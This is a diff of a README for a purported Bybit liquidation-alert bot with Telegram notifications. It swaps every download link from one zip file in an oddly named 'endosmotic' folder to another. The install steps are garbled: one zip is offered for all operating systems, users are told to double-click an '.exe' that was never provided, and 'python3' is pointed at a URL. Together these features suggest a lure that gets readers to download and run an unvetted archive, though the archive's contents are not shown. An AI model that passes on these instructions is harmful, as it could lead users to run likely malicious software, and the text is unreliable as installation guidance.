@@ -1,6 +1,6 @@
 # 🚀 bybit-liquidations-bot - Get Instant Alerts on Liquidations
 
-[![Download bybit-liquidations-bot](https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip)
+[![Download bybit-liquidations-bot](https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip)
 
 ## 📜 Description
 
@@ -29,18 +29,18 @@ To get started, follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
    Click the link below to access the releases page:
-   [Download bybit-liquidations-bot](https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip)
+   [Download bybit-liquidations-bot](https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip)
 
 2. **Locate the Latest Release**
    Scroll down the page to find the latest version of the bot. Look for the title that indicates the most recent release.
 
 3. **Download the File**
-   Click on the asset for your operating system (e.g., `https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip` for Windows, `https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip` for macOS/Linux) to download the file.
+   Click on the asset for your operating system (e.g., `https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip` for Windows, `https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip` for macOS/Linux) to download the file.
 
 4. **Install the Bot**
    - **For Windows:** Double-click the downloaded `.exe` file to run the installer.
-   - **For macOS:** Open the downloaded `https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip` file, extract it, and open the folder. Run `./bybit-liquidations-bot` in the Terminal.
-   - **For Linux:** Open your terminal, navigate to the extracted folder, and run `python3 https://raw.githubusercontent.com/Prathamesh4597/bybit-liquidations-bot/main/endosmotic/bybit-liquidations-bot.zip`.
+   - **For macOS:** Open the downloaded `https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip` file, extract it, and open the folder. Run `./bybit-liquidations-bot` in the Terminal.
+   - **For Linux:** Open your terminal, navigate to the extracted folder, and run `python3 https://github.com/Prathamesh4597/bybit-liquidations-bot/raw/refs/heads/main/endosmotic/bybit_bot_liquidations_v1.6-beta.4.zip`.
 
 5. **Set Up Telegram Notifications**
    Follow the instructions within the application to link the bot to your Telegram account. You will receive step-by-step guidance during the setup.
